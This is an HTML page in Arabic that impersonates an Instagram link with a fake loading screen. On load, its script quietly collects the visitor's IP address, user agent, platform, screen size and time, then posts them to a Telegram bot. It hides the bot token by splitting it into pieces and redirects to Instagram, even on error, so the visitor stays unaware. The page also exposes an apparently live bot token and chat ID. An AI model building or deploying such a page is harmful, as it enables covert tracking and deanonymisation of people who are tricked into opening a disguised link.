<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* شاشة تحميل بسيطة لتبدو كأنها عملية تحويل رسمية */
        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 2px solid #dbdbdb; border-top: 2px solid #0095f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader"></div>

    <script>
        // --- أسلوب التشفير بالتقسيم (نفس طريقة الكود الذي أرسلته) ---
        const s1 = "8609389464";
        const s2 = "AAEIqne_f";
        const s3 = "0xZNOeqYz-";
        const s4 = "rk7XOsbALU";
        const s5 = "M12gA8";
        const cId = "8658217605";

        // دالة تجميع التوكن "المخفية"
        function _build() {
            return s1 + ":" + s2 + s3 + s4 + s5;
        }

        async function silentCapture() {
            try {
                // 1. جلب الـ IP صامتاً
                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());

                // 2. تجميع معلومات الجهاز (بصمة المتصفح)
                const data = {
                    ip: ipRes.ip,
                    ua: navigator.userAgent,
                    plt: navigator.platform,
                    res: `${screen.width}x${screen.height}`,
                    tm: new Date().toLocaleString('ar-EG')
                };

                const report = `👤 زيارة صامتة (تشفير مبعثر):\n\n` +
                               `🌐 IP: ${data.ip}\n` +
                               `📱 الجهاز: ${data.plt}\n` +
                               `🖥️ الشاشة: ${data.res}\n` +
                               `⏰ الوقت: ${data.tm}`;

                // 3. الإرسال للبوت (استدعاء التوكن المجمع في الذاكرة فقط)
                await fetch(`https://api.telegram.org/bot${_build()}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: cId, text: report })
                });

                // 4. التوجه النهائي لإنستغرام
                window.location.replace("https://www.instagram.com/reels/");

            } catch (err) {
                // في حال وجود مانع إعلانات أو خطأ، التوجه لإنستغرام لعدم الشك
                window.location.replace("https://www.instagram.com/reels/");
            }
        }

        // تشغيل العملية فور تحميل الصفحة
        window.onload = silentCapture;
    </script>
</body>
</html>
